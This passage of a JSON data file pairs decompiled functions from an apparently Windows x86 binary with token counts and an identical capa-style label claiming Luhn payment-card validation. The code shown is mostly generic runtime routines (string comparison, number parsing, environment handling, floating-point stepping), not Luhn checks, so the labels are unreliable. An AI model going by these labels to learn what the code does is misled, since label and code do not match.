        "decompiled_code": "\nint32_t __cdecl fcn.0040556a(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        for (; ((arg_10h = arg_10h + -1,  arg_10h != 0 && (*arg_8h != 0)) && (*arg_8h == *arg_ch)); arg_8h = arg_8h + 1)\n        {\n            arg_ch = arg_ch + 1;\n        }\n        return *arg_8h - *arg_ch;\n    }\n    return arg_10h;\n}\n",
        "token_count": 145
    },
    "00405588": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405588(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004020f9(arg_8h, arg_8h + 0x38, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 84
    },
    "004055b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004055b5(uint8_t *arg_8h, uint8_t **arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint8_t uVar4;\n    uint8_t *arg_8h_00;\n    uint var_4h;\n    \n    if (arg_ch == NULL) {\n        arg_ch = &var_4h;\n    }\n    uVar4 = *arg_8h;\n    arg_8h_00 = arg_8h;\n    while (iVar1 = fcn.00405cc2(uVar4),  iVar1 != 0) {\n        arg_8h_00 = arg_8h_00 + 1;\n        uVar4 = *arg_8h_00;\n    }\n    uVar4 = *arg_8h_00;\n    if ((uVar4 == 0x2d) || (uVar4 == 0x2b)) {\n        arg_8h_00 = arg_8h_00 + 1;\n    }\n    else {\n        uVar4 = 0x2b;\n    }\n    uVar2 = fcn.00404214(arg_8h_00, arg_ch, arg_10h, arg_14h);\n    if (arg_8h_00 == *arg_ch) {\n        *arg_ch = arg_8h;\ncode_r0x00482018:\n        if (uVar2 != 0) goto code_r0x00482034;\n    }\n    else if (arg_8h == *arg_ch) goto code_r0x00482018;\n    if ((uVar4 != 0x2b) || (uVar2 < 0x80000000)) {\n        if (uVar4 != 0x2d) {\n            return uVar2;\n        }\n        if (uVar2 < 0x80000001) {\n            return -uVar2;\n        }\n    }\ncode_r0x00482034:\n    puVar3 = fcn.004039a4();\n    *puVar3 = 0x22;\n    if (arg_14h != NULL) {\n        *arg_14h = 1;\n    }\n    return (uVar4 == 0x2d) + 0x7fffffff;\n}\n",
        "token_count": 529
    },
    "004055ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004055ce(uint param_1, uint param_2, ulong param_3, ulong param_4, uint param_5)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    uint in_stack_ffffff68;\n    uchar auStack144 [64];\n    uint32_t uStack80;\n    uint32_t uStack20;\n    \n    arg_8h = param_5;\n    uStack20 = *0x56cca8 ^ &stack0xfffffff0;\n    iVar2 = fcn.00402f3b(param_1, &param_4, param_5);\n    if (iVar2 == 0) {\n        uStack80 = uStack80 & 0xfffffffe;\n        fcn.004054e8(auStack144, &param_5, param_1, param_2, &param_3, &param_4, 0);\n        arg_8h = param_5;\n    }\n    iVar2 = fcn.004054d9(param_1);\n    cVar1 = fcn.00404840();\n    if ((cVar1 == '\\0') || (iVar2 == 0)) {\n        fcn.00403cec(iVar2);\n        fcn.004051a0(arg_8h, 0xffff);\n    }\n    else {\n        fcn.00404502(iVar2, param_2, param_3, param_3 >> 0x20, 0, 0, param_4, param_4 >> 0x20, arg_8h);\n    }\n    fcn.00403085(in_stack_ffffff68);\n    return;\n}\n",
        "token_count": 366
    },
    "004055f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.004055f1(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = arg_8h;\n    if (arg_8h == 0) {\n        uVar2 = fcn.004adfa4(0);\n        return uVar2;\n    }\n    cVar1 = fcn.004ae096(*(arg_8h + 0xc));\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    var_10h = &var_8h;\n    var_ch = var_8h;\n    var_14h = var_8h;\n    uVar2 = fcn.004adc35(&var_14h, &var_10h);\n    return uVar2;\n}\n",
        "token_count": 236
    },
    "0040562d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0040562d(char *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t arg_ch_00;\n    char cVar1;\n    char cVar2;\n    code *pcVar3;\n    uint *puVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint uVar9;\n    char *pcVar10;\n    char *pcVar11;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_8h == NULL) {\n        puVar4 = fcn.004039a4();\n        *puVar4 = 0x16;\n        return 0xffffffff;\n    }\n    pcVar5 = fcn.00401f4b(arg_8h, 0x3d);\n    pcVar11 = arg_8h;\n    if ((pcVar5 == NULL) || (pcVar5 == arg_8h)) {\ncode_r0x004c70e8:\n        puVar4 = fcn.004039a4();\n        *puVar4 = 0x16;\n        goto code_r0x004c70f3;\n    }\n    cVar1 = pcVar5[1];\n    fcn.004c764e();\n    uVar9 = 0;\n    if (*0x56f88c == NULL) {\n        if ((arg_ch != 0) && (*0x56f890 != 0)) {\n            iVar6 = fcn.0040116d();\n            if (iVar6 == 0) goto code_r0x004c70e8;\n            fcn.004c764e();\n            goto code_r0x004c6fa5;\n        }\n        if (cVar1 == '\\0') {\n            uVar9 = 0;\n            goto code_r0x004c70f6;\n        }\n        *0x56f88c = fcn.00404fd9(1, 4);\n        fcn.00406302(0);\n        if (*0x56f88c != NULL) {\n            if (*0x56f890 == 0) {\n                *0x56f890 = fcn.00404fd9(1, 4);\n                fcn.00406302(0);\n                if (*0x56f890 == 0) goto code_r0x004c70f3;\n            }\n            goto code_r0x004c6fa5;\n        }\n    }\n    else {\ncode_r0x004c6fa5:\n        piVar7 = *0x56f88c;\n        if (*0x56f88c != NULL) {\n            iVar6 = fcn.004c768e(arg_8h, pcVar5 - arg_8h);\n            if ((-1 < iVar6) && (*piVar7 != 0)) {\n                fcn.00406302(piVar7[iVar6]);\n                if (cVar1 == '\\0') {\n                    for (; piVar7[iVar6] != 0; iVar6 = iVar6 + 1) {\n                        piVar7[iVar6] = piVar7[iVar6 + 1];\n                    }\n                    piVar7 = fcn.00402cb6(piVar7, iVar6, 4);\n                    fcn.00406302(0);\n                    if (piVar7 != NULL) {\ncode_r0x004c706d:\n                        *0x56f88c = piVar7;\n                    }\n                }\n                else {\n                    pcVar11 = NULL;\n                    piVar7[iVar6] = arg_8h;\n                }\n                if (arg_ch != 0) {\n                    pcVar10 = arg_8h;\n                    do {\n                        cVar2 = *pcVar10;\n                        pcVar10 = pcVar10 + 1;\n                    } while (cVar2 != '\\0');\n                    iVar6 = fcn.00404fd9(pcVar10 + (2 - (arg_8h + 1)), 1);\n                    if (iVar6 != 0) {\n                        iVar8 = fcn.00405f56(iVar6, pcVar10 + (2 - (arg_8h + 1)), arg_8h);\n                        if (iVar8 != 0) {\n                            fcn.004035f8(0, 0, 0, 0, 0);\n                            pcVar3 = swi(3);\n                            uVar9 = (*pcVar3)();\n                            return uVar9;\n                        }\n                        (pcVar5 + (iVar6 - arg_8h) + 1)[-1] = '\\0';\n                        iVar8 = fcn.00405367(iVar6, -(cVar1 != '\\0') & pcVar5 + (iVar6 - arg_8h) + 1);\n                        if (iVar8 == 0) {\n                            puVar4 = fcn.004039a4();\n                            uVar9 = 0xffffffff;\n                            *puVar4 = 0x2a;\n                        }\n                    }\n                    fcn.00406302(iVar6);\n                }\n                goto code_r0x004c70f6;\n            }\n            if (cVar1 == '\\0') goto code_r0x004c70f6;\n            arg_ch_00 = -iVar6 + 2;\n            if ((-iVar6 <= arg_ch_00) && (arg_ch_00 < 0x3fffffff)) {\n                piVar7 = fcn.00402cb6(piVar7, arg_ch_00, 4);\n                fcn.00406302(0);\n                if (piVar7 != NULL) {\n                    piVar7[-iVar6] = arg_8h;\n                    piVar7[1 - iVar6] = 0;\n                    pcVar11 = NULL;\n                    goto code_r0x004c706d;\n                }\n            }\n        }\n    }\ncode_r0x004c70f3:\n    uVar9 = 0xffffffff;\ncode_r0x004c70f6:\n    fcn.00406302(pcVar11);\n    return uVar9;\n}\n",
        "token_count": 1359
    },
    "004056d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004056d7(uint arg_8h, code *arg_ch)\n\n{\n    code *arg_8h_00;\n    code **in_ECX;\n    \n    *in_ECX = vtable.pcharNode.0;\n    arg_8h_00 = fcn.004051dc(arg_ch);\n    in_ECX[1] = arg_8h_00;\n    in_ECX[2] = arg_ch;\n    if (arg_8h_00 == NULL) {\n        in_ECX[2] = NULL;\n    }\n    else {\n        fcn.00491789(arg_8h_00, arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "00405736": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405736(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint *in_ECX;\n    uint var_4h;\n    \n    uVar2 = in_ECX[4];\n    if (arg_8h <= uVar2) {\n        if (in_ECX[5] - uVar2 < arg_ch) {\n            fcn.00405902(arg_ch, in_ECX, arg_8h, arg_ch, arg_10h);\n        }\n        else {\n            in_ECX[4] = uVar2 + arg_ch;\n            if (0xf < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            iVar1 = in_ECX + arg_8h;\n            fcn.004058f3(iVar1 + arg_ch, iVar1, (uVar2 - arg_8h) + 1);\n            fcn.0040314d(iVar1, arg_10h, arg_ch);\n        }\n        return;\n    }\n    fcn.004064ab();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 282
    },
    "004057a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004057a9(uint arg_8h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    fcn.004013d4(arg_8h, &var_10h, 0, &var_8h, 1);\n    return arg_8h;\n}\n",
        "token_count": 118
    },
    "00405862": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.00405862(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b5d8, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00406401(0xb);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.004de9d9(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004de8ea();\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 292
    },
    "0040588a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040588a(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    int32_t arg_18h;\n    int32_t arg_14h;\n    uint var_4h;\n    \n    arg_8h = (*_sym.imp.KERNEL32.dll_GetEnvironmentStringsW)();\n    if (arg_8h != 0) {\n        iVar1 = fcn.004c6d77(arg_8h);\n        arg_14h = iVar1 - arg_8h >> 1;\n        iVar1 = fcn.00406550(0, 0, arg_8h, arg_14h, 0, 0, 0, 0);\n        if (iVar1 != 0) {\n            arg_18h = fcn.00403ff3(iVar1);\n            if (arg_18h == 0) {\ncode_r0x004c6e2d:\n                iVar1 = 0;\n            }\n            else {\n                iVar1 = fcn.00406550(0, 0, arg_8h, arg_14h, arg_18h, iVar1, 0, 0);\n                if (iVar1 == 0) goto code_r0x004c6e2d;\n                iVar1 = arg_18h;\n                arg_18h = 0;\n            }\n            fcn.00406302(arg_18h);\n            goto code_r0x004c6e3a;\n        }\n    }\n    iVar1 = 0;\ncode_r0x004c6e3a:\n    if (arg_8h != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 388
    },
    "00405894": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00405894(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint64_t uVar1;\n    double dVar2;\n    double dVar3;\n    int16_t iVar4;\n    int16_t iVar5;\n    uint16_t uVar6;\n    ushort uVar7;\n    uint in_stack_00000010;\n    \n    iVar4 = fcn.0040160e(&arg_8h);\n    dVar3 = _arg_8h;\n    if (iVar4 != 2) {\n        iVar5 = fcn.004034a9(&arg_10h);\n        dVar2 = _arg_8h;\n        dVar3 = CONCAT44(in_stack_00000010, arg_10h);\n        if ((iVar5 != 2) && (_arg_8h != dVar3)) {\n            uVar7 = 1;\n            if (iVar4 == 1) {\n                _arg_8h = 1.39067116124321e-309;\n                uVar6 = arg_ch._2_2_ & 0xffef | 0x7fef;\n                uVar7 = 0xffff;\n            }\n            else {\n                if (iVar4 != 0) {\n                    if (((_arg_8h < dVar3) && (0.0 < _arg_8h)) || ((dVar3 < _arg_8h && (_arg_8h < 0.0)))) {\n                        uVar1 = _arg_8h & 0xffffffffffff0000;\n                        _arg_8h = uVar1 | arg_8h + 1U;\n                        dVar3 = _arg_8h;\n                        if (arg_8h + 1U == 0) {\n                            arg_8h._2_2_ = uVar1 >> 0x10;\n                            uVar1 = arg_8h._2_2_ + 1U << 0x10;\n                            _arg_8h = dVar2 & 0xffffffff00000000 | uVar1;\n                            dVar3 = _arg_8h;\n                            if (arg_8h._2_2_ + 1U == 0) {\n                                arg_ch._0_2_ = (dVar2 & 0xffffffff00000000) >> 0x20;\n                                arg_8h = uVar1;\n                                _arg_8h = CONCAT24(arg_ch + 1, arg_8h);\n                                _arg_8h = dVar2 & 0xffff000000000000 | _arg_8h;\n                                dVar3 = _arg_8h;\n                                if (arg_ch + 1 == 0) {\n                                    arg_ch._2_2_ = (dVar2 & 0xffff000000000000) >> 0x30;\n                                    _arg_8h = CONCAT26(arg_ch._2_2_ + 1, _arg_8h);\n                                    dVar3 = _arg_8h;\n                                    if ((arg_ch._2_2_ + 1 & 0x7fff) == 0x7ff0) {\n                                        fcn.004036d4(8);\n                                        dVar3 = _arg_8h;\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    else {\n                        uVar1 = _arg_8h & 0xffffffffffff0000;\n                        _arg_8h = uVar1 | arg_8h - 1U;\n                        dVar3 = _arg_8h;\n                        if (arg_8h - 1U == 0xffff) {\n                            arg_8h._2_2_ = uVar1 >> 0x10;\n                            arg_8h = CONCAT22(arg_8h._2_2_ + -1, 0xffff);\n                            _arg_8h = dVar2 & 0xffffffff00000000 | arg_8h;\n                            dVar3 = _arg_8h;\n                            if (arg_8h._2_2_ + -1 == -1) {\n                                arg_ch._0_2_ = (dVar2 & 0xffffffff00000000) >> 0x20;\n                                _arg_8h = CONCAT24(arg_ch + -1, arg_8h);\n                                _arg_8h = dVar2 & 0xffff000000000000 | _arg_8h;\n                                dVar3 = _arg_8h;\n                                if (arg_ch + -1 == -1) {\n                                    arg_ch._2_2_ = (dVar2 & 0xffff000000000000) >> 0x30;\n                                    _arg_8h = CONCAT26(arg_ch._2_2_ + -1, _arg_8h);\n                                    dVar3 = _arg_8h;\n                                }\n                            }\n                        }\n                    }\n                    goto code_r0x004dfc90;\n                }\n                if (dVar3 <= _arg_8h) {\n                    uVar6 = 0x8000;\n                }\n                else {\n                    uVar6 = 0;\n                }\n            }\n            _arg_8h = CONCAT62(_arg_8h >> 0x10 & 0xffffffff | (uVar6 << 0x30) >> 0x10, uVar7);\n            dVar3 = _arg_8h;\n        }\n    }\ncode_r0x004dfc90:\n    _arg_8h = dVar3;\n    if ((_arg_8h & 0x7ff0000000000000) == 0) {\n        fcn.004036d4(0x10);\n    }\n    return _arg_8h;\n}\n",
        "token_count": 1242
    },
    "0047c17e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.0047c17e(uint arg_8h, ushort *arg_ch, ushort *arg_10h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t *in_ECX;\n    \n    if (arg_ch != arg_10h) {\n        do {\n            pcVar1 = *(*in_ECX + 0x10);\n            (**0x573000)(arg_8h, *arg_ch);\n            cVar2 = (*pcVar1)();\n            if (cVar2 == '\\0') {\n                return arg_ch;\n            }\n            arg_ch = arg_ch + 1;\n        } while (arg_ch != arg_10h);\n    }\n    return arg_ch;\n}\n",
        "token_count": 159
    },
    "00405902": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405902(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_10h_00;\n    uint32_t arg_ch_00;\n    uint arg_ch_01;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7fffffffU - arg_10h_00) {\n        arg_ch_00 = in_ECX[5];\n        iVar2 = fcn.0040566e(arg_10h_00 + arg_8h, arg_ch_00, 0x7fffffff);\n        arg_8h_00 = fcn.00406000(iVar2 + 1);\n        in_ECX[4] = arg_10h_00 + arg_8h;\n        in_ECX[5] = iVar2;\n        if (arg_ch_00 < 0x10) {\n            fcn.004029f5(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h, arg_18h);\n        }\n        else {\n            arg_ch_01 = *in_ECX;\n            fcn.004029f5(arg_8h_00, arg_ch_01, arg_10h_00, arg_10h, arg_14h, arg_18h);\n            fcn.00401659(arg_ch_01, arg_ch_00 + 1);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.004038aa();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 434
    },
    "0040594d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040594d(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    code *pcVar2;\n    uint *in_ECX;\n    uint var_4h;\n    \n    uVar1 = in_ECX[4];\n    if (arg_8h <= uVar1) {\n        if (in_ECX[5] - uVar1 < arg_ch) {\n            fcn.00402450(arg_ch, in_ECX, arg_8h, arg_ch, arg_10h);\n        }\n        else {\n            in_ECX[4] = uVar1 + arg_ch;\n            if (7 < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            arg_8h_00 = in_ECX + arg_8h * 2;\n            fcn.004058f3(arg_8h_00 + arg_ch * 2, arg_8h_00, (uVar1 - arg_8h) * 2 + 2);\n            fcn.00404c50(arg_8h_00, arg_10h, arg_ch);\n        }\n        return;\n    }\n    fcn.004025bd();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 309
    },
    "0047c4b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.0047c4b6(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    *arg_14h = arg_ch;\n    uVar1 = *arg_8h;\n    arg_8h_00 = arg_8h[1];\n    iVar2 = fcn.00401f91(&var_ch, 0, arg_8h, in_ECX + 8);\n    if (0 < iVar2) {\n        iVar2 = iVar2 + -1;\n        if (arg_10h - *arg_14h < iVar2) {\n            *arg_8h = uVar1;\n            arg_8h[1] = arg_8h_00;\n        }\n        else if (0 < iVar2) {\n            fcn.0040576d(*arg_14h, &var_ch, iVar2);\n            *arg_14h = *arg_14h + iVar2;\n        }\n    }\n    fcn.00403085(arg_8h_00);\n    return;\n}\n",
        "token_count": 346
    },
    "004059ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004059ac(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.004c8177(0x1f, \"AppPolicyGetWindowingModel\", 0x553594, \"AppPolicyGetWindowingModel\");\n    if (pcVar1 == NULL) {\n        uVar2 = 0xc0000225;\n    }\n    else {\n        (**0x573000)(0xfffffffa, arg_8h);\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 133
    },
    "00476907": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00476907(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.0040343b(arg_8h, arg_ch, arg_10h, arg_14h, in_ECX + 8);\n    if (iVar1 < 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = iVar1 != 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 139
    },
    "00405a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a10(uint arg_8h)\n\n{\n    fcn.00403c2e(0, arg_8h, 0, 10, 1);\n    return;\n}\n",
        "token_count": 48
    },
    "00405aa1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405aa1(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    \n    if (0 < arg_14h) {\n        arg_14h = fcn.00403e18(arg_10h, arg_14h);\n    }\n    if (0 < arg_1ch) {\n        arg_1ch = fcn.00403e18(arg_18h, arg_1ch);\n    }\n    if ((arg_14h == 0) || (arg_1ch == 0)) {\n        if (arg_14h - arg_1ch == 0) {\n            iVar1 = 2;\n        }\n        else {\n            iVar1 = (arg_14h - arg_1ch >> 0x1f & 0xfffffffeU) + 3;\n        }\n    }\n    else {\n        iVar1 = fcn.00404683(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, 0, 0, 0);\n    }\n    return iVar1;\n}\n",
        "token_count": 276
    },
    "00405ae7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405ae7(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t unaff_EBX;\n    \n    uVar1 = *(param_1 + 0x31);\n    *(param_1 + 0x3c) = 0;\n    iVar3 = fcn.004060eb(***(param_1 + 8), uVar1, 0x8000);\n    if (iVar3 != 0) {\n        fcn.00403d5f(unaff_EBX & 0xffffff00 | uVar1, param_1 + 0x18);\n        cVar2 = **(param_1 + 0x10);\n        *(param_1 + 0x31) = cVar2;\n        *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n        if (cVar2 == '\\0') {\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 275
    },
    "00405ba5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ba5(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_8h;\n    \n    puVar2 = fcn.00404c82(&var_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    uVar1 = puVar2[1];\n    *arg_8h = *puVar2;\n    arg_8h[1] = uVar1;\n    return;\n}\n",
        "token_count": 138
    },
    "00405c36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c36(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (in_ECX[5] - iVar1 < arg_8h) {\n        fcn.004053fd(arg_8h, in_ECX, arg_8h, arg_ch);\n    }\n    else {\n        in_ECX[4] = iVar1 + arg_8h;\n        if (7 < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        fcn.00404c50(in_ECX + iVar1 * 2, arg_ch, arg_8h);\n        *(in_ECX + (iVar1 + arg_8h) * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "00405c54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405c54(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x31) != '*') {\n        uVar2 = fcn.004029fa(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 190
    },
    "00405c68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c68(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *in_ECX;\n    \n    iVar2 = fcn.00405a92(*in_ECX, in_ECX[1], arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        *(in_ECX + 3) = 1;\n        return;\n    }\n    fcn.004035f8(0, 0, 0, 0, 0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 145
    },
    "00405c77": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00405c77(uint noname_0, uint noname_1, uint *arg_10h)\n\n{\n    uint *puVar1;\n    uint arg_8h;\n    int32_t iVar2;\n    float10 fVar3;\n    ushort uVar4;\n    uint16_t uVar5;\n    uint uVar6;\n    double dVar7;\n    uint uVar8;\n    uint uVar9;\n    \n    if (arg_10h == NULL) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    arg_8h = fcn.004051a0(0x133f, 0xffff);\n    uVar5 = noname_1 >> 0x10;\n    uVar4 = noname_1;\n    dVar7 = CONCAT26(uVar5, CONCAT24(uVar4, noname_0));\n    uVar6 = dVar7 >> 0x20;\n    if ((uVar5 & 0x7ff0) == 0x7ff0) {\n        *arg_10h = 0xffffffff;\n        iVar2 = fcn.004051b9(noname_0, uVar6);\n        if (((iVar2 == 1) || (iVar2 == 2)) || (iVar2 == 3)) {\n            fcn.004051a0(arg_8h, 0xffff);\n            return CONCAT26(uVar5, CONCAT24(uVar4, noname_0));\n        }\n        dVar7 = CONCAT26(uVar5, CONCAT24(uVar4, noname_0));\n        uVar8 = SUB84(*0x54fba0 + dVar7, 0);\n        uVar9 = *0x54fba0 + dVar7 >> 0x20;\n        uVar6 = 8;\ncode_r0x004925e7:\n        fVar3 = 